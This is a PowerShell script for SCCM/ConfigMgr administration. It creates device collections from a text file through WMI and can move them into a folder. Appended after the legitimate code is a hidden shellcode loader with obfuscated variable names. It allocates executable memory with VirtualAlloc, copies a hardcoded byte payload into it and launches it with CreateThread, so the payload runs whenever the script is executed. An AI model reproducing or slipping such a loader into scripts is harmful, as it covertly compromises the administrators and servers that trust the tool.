
[CmdletBinding()]
param(
    [parameter(Mandatory=$true, HelpMessage="Specify Primary Site server")]
    [string]$SiteServer = "$($env:COMPUTERNAME)",
    [parameter(Mandatory=$true, HelpMessage="Path to text file")]
    [ValidateScript({Test-Path -Path $_ -Include *.txt})]
    [string]$FilePath,
    [parameter(Mandatory=$true)]
    [string]$LimitingCollectionName,
    [parameter(Mandatory=$false)]
    [string]$FolderName
)

Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose "SiteCode: $($SiteCode)"
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    
    try {
        $LimitingCollectionID = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($LimitingCollectionName)'" | Select-Object -ExpandProperty CollectionID
    }
    catch [Exception] {
        Throw "Unable to determine Limiting Collection ID"
    }
}
Process {
    
    function New-ScheduleToken {
        param(
        [parameter(Mandatory=$false)]
        $DayDuration = 0,
        [parameter(Mandatory=$false)]
        $DaySpan = 0,
        [parameter(Mandatory=$false)]
        $HourDuration = 0,
        [parameter(Mandatory=$false)]
        $HourSpan = 0,
        [parameter(Mandatory=$false)]
        [bool]$IsGMT = $false,
        [parameter(Mandatory=$false)]
        $MinuteDuration = 0,
        [parameter(Mandatory=$false)]
        $MinuteSpan = 0,
        [parameter(Mandatory=$true)]
        $StartTimeHour = 0,
        [parameter(Mandatory=$true)]
        $StartTimeMin = 0,
        [parameter(Mandatory=$true)]
        $StartTimeSec = 0
        )
        $StartTime = [System.Management.ManagementDateTimeconverter]::ToDMTFDateTime((Get-Date -Hour $StartTimeHour -Minute $StartTimeMin -Second $StartTimeSec))
        $ScheduleToken = ([WMIClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ST_RecurInterval").CreateInstance()
        $ScheduleToken.DayDuration = $DayDuration
        $ScheduleToken.DaySpan = $DaySpan
        $ScheduleToken.HourDuration = $HourDuration
        $ScheduleToken.HourSpan = $HourSpan
        $ScheduleToken.IsGMT = $IsGMT
        $ScheduleToken.MinuteDuration = $MinuteDuration
        $ScheduleToken.MinuteSpan = $MinuteSpan
        $ScheduleToken.StartTime = $StartTime
        return $ScheduleToken
    }
    
    try {
        $CollectionNames = Get-Content -Path $FilePath
        foreach ($CollectionName in $CollectionNames) {
            Write-Verbose "Creating collection: $($CollectionName)"
            $WMIConnection = [WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_Collection"
            $NewDeviceCollection = $WMIConnection.psbase.CreateInstance()
            $NewDeviceCollection.Name = "$($CollectionName)"
            $NewDeviceCollection.OwnedByThisSite = $True
            $NewDeviceCollection.LimitToCollectionID = "$($LimitingCollectionID)"
            $NewDeviceCollection.RefreshSchedule = (New-ScheduleToken -HourSpan 12 -StartTimeHour 7 -StartTimeMin 0 -StartTimeSec 0)
            $NewDeviceCollection.RefreshType = 2
            $NewDeviceCollection.CollectionType = 2
            $Create = $NewDeviceCollection.Put() | Out-Null
            if ($Create.ReturnValue -eq "0") {
                Write-Verbose "Successfully created collection '$($CollectionName)'"
            }
            
            if ($PSBoundParameters["FolderName"]) {
                try {
                    
                    $CollectionID = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -Filter "Name='$($CollectionName)' and CollectionType = '2'" | Select-Object -ExpandProperty CollectionID
                    
                    [int]$TargetFolder = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ObjectContainerNode -Filter "ObjectType = '5000' and Name = '$($FolderName)'" -ComputerName $SiteServer | Select-Object -ExpandProperty ContainerNodeID
                    
                    [int]$SourceFolder = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ObjectContainerItem -Filter "InstanceKey = '$($CollectionID)'" -ComputerName $SiteServer | Select-Object -ExpandProperty ContainerNodeID
                    
                    $Parameters = ([WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ObjectContainerItem").psbase.GetMethodParameters("MoveMembers")
                    $Parameters.ObjectType = 5000
                    $Parameters.ContainerNodeID = $SourceFolder
                    $Parameters.TargetContainerNodeID = $TargetFolder
                    $Parameters.InstanceKeys = $CollectionID
                    $Move = ([WmiClass]"\\$($SiteServer)\root\SMS\Site_$($SiteCode):SMS_ObjectContainerItem").psbase.InvokeMethod("MoveMembers",$Parameters,$null)
                    if ($Move.ReturnValue -eq "0") {
                        Write-Verbose "Moved collection '$($CollectionName)' to '$($FolderName)' folder"
                    }
                }
                catch [Exception] {
                    Throw $_.Exception.Message
                }
            }
        }
    }
    catch [Exception] {
        Write-Error $_.Exception.Message
    }
}
$vjFG = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $vjFG -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x4c,0x54,0xcb,0xbd,0xda,0xd9,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x75,0x13,0x03,0x75,0x13,0x83,0xc5,0x48,0xb6,0x3e,0x41,0xb8,0xb4,0xc1,0xba,0x38,0xd9,0x48,0x5f,0x09,0xd9,0x2f,0x2b,0x39,0xe9,0x24,0x79,0xb5,0x82,0x69,0x6a,0x4e,0xe6,0xa5,0x9d,0xe7,0x4d,0x90,0x90,0xf8,0xfe,0xe0,0xb3,0x7a,0xfd,0x34,0x14,0x43,0xce,0x48,0x55,0x84,0x33,0xa0,0x07,0x5d,0x3f,0x17,0xb8,0xea,0x75,0xa4,0x33,0xa0,0x98,0xac,0xa0,0x70,0x9a,0x9d,0x76,0x0b,0xc5,0x3d,0x78,0xd8,0x7d,0x74,0x62,0x3d,0xbb,0xce,0x19,0xf5,0x37,0xd1,0xcb,0xc4,0xb8,0x7e,0x32,0xe9,0x4a,0x7e,0x72,0xcd,0xb4,0xf5,0x8a,0x2e,0x48,0x0e,0x49,0x4d,0x96,0x9b,0x4a,0xf5,0x5d,0x3b,0xb7,0x04,0xb1,0xda,0x3c,0x0a,0x7e,0xa8,0x1b,0x0e,0x81,0x7d,0x10,0x2a,0x0a,0x80,0xf7,0xbb,0x48,0xa7,0xd3,0xe0,0x0b,0xc6,0x42,0x4c,0xfd,0xf7,0x95,0x2f,0xa2,0x5d,0xdd,0xdd,0xb7,0xef,0xbc,0x89,0x74,0xc2,0x3e,0x49,0x13,0x55,0x4c,0x7b,0xbc,0xcd,0xda,0x37,0x35,0xc8,0x1d,0x38,0x6c,0xac,0xb2,0xc7,0x8f,0xcd,0x9b,0x03,0xdb,0x9d,0xb3,0xa2,0x64,0x76,0x44,0x4b,0xb1,0xe3,0x41,0xdb,0xfa,0x5c,0x48,0x76,0x93,0x9e,0x4b,0x99,0x3f,0x16,0xad,0xc9,0xef,0x78,0x62,0xa9,0x5f,0x39,0xd2,0x41,0x8a,0xb6,0x0d,0x71,0xb5,0x1c,0x26,0x1b,0x5a,0xc9,0x1e,0xb3,0xc3,0x50,0xd4,0x22,0x0b,0x4f,0x90,0x64,0x87,0x7c,0x64,0x2a,0x60,0x08,0x76,0xda,0x80,0x47,0x24,0x4c,0x9e,0x7d,0x43,0x70,0x0a,0x7a,0xc2,0x27,0xa2,0x80,0x33,0x0f,0x6d,0x7a,0x16,0x04,0xa4,0xee,0xd9,0x72,0xc9,0xfe,0xd9,0x82,0x9f,0x94,0xd9,0xea,0x47,0xcd,0x89,0x0f,0x88,0xd8,0xbd,0x9c,0x1d,0xe3,0x97,0x71,0xb5,0x8b,0x15,0xac,0xf1,0x13,0xe5,0x9b,0x03,0x6f,0x30,0xe5,0x71,0x81,0x80;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$SSkA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($SSkA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$SSkA,0,0,0);for (;;){Start-sleep 60};

